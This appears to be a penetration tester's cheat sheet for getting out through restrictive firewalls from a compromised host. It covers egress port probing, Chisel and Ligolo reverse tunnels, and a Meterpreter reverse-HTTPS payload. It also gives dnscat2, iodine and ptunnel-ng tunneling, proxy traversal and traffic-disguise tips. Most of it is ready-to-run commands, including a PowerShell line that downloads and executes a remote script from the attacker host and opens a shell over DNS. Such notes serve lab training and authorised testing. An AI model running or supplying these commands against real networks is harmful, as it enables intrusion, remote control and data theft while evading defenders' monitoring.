# Network Filter & Egress Bypass

When you have code execution but standard Chisel/Ligolo/Meterpreter connections fail, the firewall is restricting outbound traffic. This documents how to identify what egress is available and tunnel through it.

---

## Step 1: Egress Discovery — What Ports Are Open?

Before trying any tunnel, map what can actually leave the network.

```bash
# Kali: listen on all common ports simultaneously
# Use allports.exposed (external service) — victim connects out, site reports what hit it
# OR: manually listen on common ports and test from victim

# Kali: listen on multiple ports (run each in a separate terminal or &):
nc -lvp 80 &; nc -lvp 443 &; nc -lvp 53 &; nc -lvp 8080 &; nc -lvp 3389 &; nc -lvp 4444 &

# Victim: probe each port (PowerShell)
$ports = 21,22,25,53,80,443,445,8080,8443,3389,4444
foreach ($p in $ports) {
    try {
        $t = New-Object Net.Sockets.TcpClient; $t.Connect("192.168.45.202", $p)
        if ($t.Connected) { Write-Host "OPEN: $p" }; $t.Close()
    } catch {}
}

# Or one-liner:
21,22,25,53,80,443,445,8080,8443,3389 | ForEach { try { $t=New-Object Net.Sockets.TcpClient; $t.Connect("192.168.45.202",$_); Write-Host "OPEN $_"; $t.Close() } catch {} }

# Linux victim:
for p in 21 22 25 53 80 443 445 8080 8443 3389 4444; do (echo >/dev/tcp/192.168.45.202/$p) 2>/dev/null && echo "OPEN $p"; done
```

**Common open ports by environment:**
| Port | Protocol | When Available |
|------|----------|---------------|
| 80 | HTTP | Almost everywhere |
| 443 | HTTPS | Almost everywhere |
| 53 | DNS | Almost everywhere |
| 3389 | RDP | Corporate networks allowing RDP |
| 8080 | HTTP-alt | Dev/proxy environments |
| 445 | SMB | Internal networks only |

---

## Step 2: Tunnel Over Available Port

### Option A: Chisel over HTTP/443 (Most Reliable)

```bash
# Kali server — run on whatever port is open:
./chisel server --reverse --port 443 --socks5
# Or port 80:
./chisel server --reverse --port 80 --socks5

# Windows victim — connect back (replace 443 with whatever is open):
.\chisel.exe client 192.168.45.202:443 R:socks

# Linux victim:
./chisel client 192.168.45.202:443 R:socks
```

### Option B: Ligolo-ng over 443 (TUN interface, no proxychains)

```bash
# Kali server — listen on 443 instead of default 11601:
./proxy -selfcert -laddr 0.0.0.0:443

# Windows victim:
.\agent.exe -connect 192.168.45.202:443 -ignore-cert

# Linux victim:
./agent -connect 192.168.45.202:443 -ignore-cert
```

### Option C: Meterpreter HTTPS (Blends with Web Traffic)

```bash
# Generate stageless payload for port 443 HTTPS:
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.202 LPORT=443 -f raw -o shell.bin

# Handler:
use multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_https
set LHOST 192.168.45.202
set LPORT 443
run -j
```

---

## Step 3: DNS Tunneling (When Only Port 53 Is Open)

DNS is almost never blocked — every machine needs name resolution. DNS tunneling encodes data in DNS query/response packets.

### dnscat2 (Recommended — No Server Infrastructure Needed)

dnscat2 works over existing DNS infrastructure. The victim sends DNS queries to a domain you control; your Kali is the authoritative nameserver.

**Kali setup:**

```bash
# Install:
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server && gem install bundler && bundle install

# Run dnscat2 server (no DNS delegation needed — direct UDP):
ruby dnscat2.rb --dns "host=0.0.0.0,port=53,domain=attacker.com" --no-cache

# Without a domain (direct IP mode — victim talks directly to your Kali DNS port):
ruby dnscat2.rb --dns "host=0.0.0.0,port=53"
```

**Windows victim:**
```powershell
# Download and run dnscat2 PowerShell client:
IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.202/dnscat2.ps1')
Start-Dnscat2 -DNSServer 192.168.45.202 -Domain attacker.com -PreSharedSecret s3cr3t -Exec cmd

# Or use the compiled binary:
.\dnscat.exe --dns server=192.168.45.202,port=53 --secret s3cr3t
```

**Using the dnscat2 session:**
```
dnscat2> sessions                    # list sessions
dnscat2> session -i 1                # interact with session 1
command (victim)> exec --command cmd # get a shell
command (victim)> shell              # interactive shell
command (victim)> download file.txt  # file transfer
```

**Create a TCP tunnel through dnscat2 for proxychains:**
```
command (victim)> listen 0.0.0.0:1080    # SOCKS proxy on victim (won't work — use port tunnel instead)
# Better: port forward
command (victim)> listen 127.0.0.1:3390 172.16.1.5:3389    # RDP forward through DNS tunnel
# Kali: xfreerdp /v:127.0.0.1:3390
```

---

### iodine (Requires DNS Delegation — Faster)

iodine requires that you own a domain and have delegated a subdomain's NS records to your Kali. Faster than dnscat2 but more setup.

**DNS setup (Kali as nameserver):**
```
# In your domain registrar, add:
#   t1.yourdomain.com  NS  kali.yourdomain.com
#   kali.yourdomain.com  A  <YOUR_KALI_IP>
```

**Kali:**
```bash
# Start iodine server (creates tun0 with 10.0.0.1):
sudo iodined -f -c -P secretpass 10.0.0.0/24 t1.yourdomain.com

# Kali is now 10.0.0.1 — victim gets 10.0.0.2
```

**Windows victim:**
```powershell
# Run iodine client:
.\iodine.exe -f -P secretpass t1.yourdomain.com

# Victim now has a 10.0.0.2 address reachable from Kali
# SSH through the DNS tunnel:
# Kali: ssh user@10.0.0.2
# Then from victim's shell, use standard Chisel/Ligolo
```

---

## Step 4: ICMP Tunneling (When Only Ping Works)

Less common but sometimes the only option. ICMP echo (ping) is rarely inspected deeply.

```bash
# Kali: start ptunnel server
sudo ptunnel-ng -R

# Windows victim: connect through ICMP
.\ptunnel-ng.exe -p 192.168.45.202 -lp 2222 -da 127.0.0.1 -dp 22
# This creates a local port 2222 that tunnels to victim's port 22 via ICMP

# Kali: SSH through the ICMP tunnel
ssh -p 2222 user@127.0.0.1
# Then from the SSH session, use standard Chisel/Ligolo for further pivoting
```

---

## Step 5: HTTP/S Proxy Traversal (Corporate Proxy)

If the victim goes through an outbound web proxy (traffic blocked at the perimeter, only HTTP/S through proxy allowed):

```bash
# Chisel — supports HTTP proxy traversal natively:
.\chisel.exe client --proxy http://proxy.corp.com:8080 192.168.45.202:443 R:socks

# If proxy requires auth:
.\chisel.exe client --proxy http://DOMAIN\\user:pass@proxy.corp.com:8080 192.168.45.202:443 R:socks

# Meterpreter — set GlobalProxy in msfconsole:
setg Proxies http:proxy.corp.com:8080
# Then generate payload and connect
```

---

## Quick Reference — What to Try and When

```
Connection fails completely?
│
├── Run egress port scan first
│   └── Port 443 open?     → Chisel/Ligolo on 443 (best option)
│   └── Port 80 open?      → Chisel/Ligolo on 80
│   └── Port 8080 open?    → Chisel/Ligolo on 8080
│   └── Only port 53?      → dnscat2 (no domain needed)
│   └── Only ICMP?         → ptunnel-ng
│
├── Connection succeeds but then dies?
│   └── DPI killing long sessions → set keepalive intervals
│   └── Chisel: --keepalive 30s
│   └── SSH: ServerAliveInterval 30
│
└── Goes through a proxy?
    └── Chisel --proxy flag
    └── Set CONNECT method proxy in environment
```

---

## Firewall Evasion Tips

```bash
# Run Chisel server on 443 WITH a self-signed cert (looks like HTTPS):
./chisel server --reverse --port 443 --tls-cert cert.pem --tls-key key.pem --socks5
# Generate cert: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# Run Ligolo on 443 — the TLS handshake (-selfcert) makes it look like HTTPS
./proxy -selfcert -laddr 0.0.0.0:443

# For Meterpreter HTTPS — use a real domain with Let's Encrypt cert to look legitimate:
# msfvenom ... LHOST=yourdomain.com LPORT=443 ...
# Set up an A record pointing yourdomain.com to your Kali IP

# Random user agent on Chisel (blends with web traffic):
.\chisel.exe client --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" 192.168.45.202:443 R:socks
```
